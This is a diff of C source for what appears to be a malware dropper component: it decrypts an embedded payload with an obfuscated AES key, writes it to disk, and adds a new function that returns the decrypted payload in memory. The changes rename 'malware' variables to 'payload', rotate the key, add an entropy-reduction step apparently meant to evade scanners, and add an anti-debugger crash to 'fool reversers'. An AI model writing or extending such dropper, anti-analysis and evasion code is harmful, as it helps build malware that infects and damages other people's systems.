@@ -27,14 +27,14 @@ bool xPayloadManagerDrop(const wchar_t* fileName)
 	uint32_t keySize = 0;
 
 	// Convert obfuscated key string to buffer
-	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("a7d4fa01c302eae6202d6073cbf65f23f1bb6e4d07e7ad30bbedf75bc8b0415e"), &key, &keySize))
+	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("93d2d334513e6d80268da1da978c37af60c141a7289229d191f05c7db5b1392f"), &key, &keySize))
 	{
-		uint8_t* malware = NULL;
+		uint8_t* payload = NULL;
 
-		uint32_t malwareSize = 0;
+		uint32_t payloadSize = 0;
 
-		// Deobfuscate malware
-		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_malware, sizeof(s_malware), &malware, &malwareSize))
+		// Deobfuscate payload
+		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_payload, sizeof(s_payload), &payload, &payloadSize, xObfuscationEntropyReduce))
 		{
 			wchar_t fileNameDrop[MAX_PATH + 1] = { 0 };
 
@@ -52,7 +52,7 @@ bool xPayloadManagerDrop(const wchar_t* fileName)
 
 					if (file != INVALID_HANDLE_VALUE)
 					{
-						if (X_KERNEL32_CALL(WriteFile)(file, malware, malwareSize, NULL, NULL))
+						if (X_KERNEL32_CALL(WriteFile)(file, payload, payloadSize, NULL, NULL))
 						{
 							result = true;
 						}
@@ -62,7 +62,7 @@ bool xPayloadManagerDrop(const wchar_t* fileName)
 				}
 			}
 
-			X_LIB_MALICIOUS_CALL(xMemoryFree)(malware);
+			X_LIB_MALICIOUS_CALL(xMemoryFree)(payload);
 		}
 
 		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
@@ -83,6 +83,45 @@ bool xPayloadManagerDropAndExecute(const wchar_t* fileName)
 	if (result)
 	{
 
+	}
+
+	return result;
+}
+
+bool xPayloadManagerGetPayload(uint8_t** payload, uint32_t* payloadSize)
+{
+	if (!payload || !payloadSize)
+	{
+		return false;
+	}
+
+	bool result = false;
+
+	// Fool reversers
+	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();
+
+	uint8_t* key = NULL;
+
+	uint32_t keySize = 0;
+
+	// Convert obfuscated key string to buffer
+	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("93d2d334513e6d80268da1da978c37af60c141a7289229d191f05c7db5b1392f"), &key, &keySize))
+	{
+		uint8_t* out = NULL;
+
+		uint32_t outSize = 0;
+
+		// Deobfuscate payload
+		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_payload, sizeof(s_payload), &out, &outSize, xObfuscationEntropyReduce))
+		{
+			*payload = out;
+
+			*payloadSize = outSize;
+
+			result = true;
+		}
+
+		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
 	}
 
 	return result;
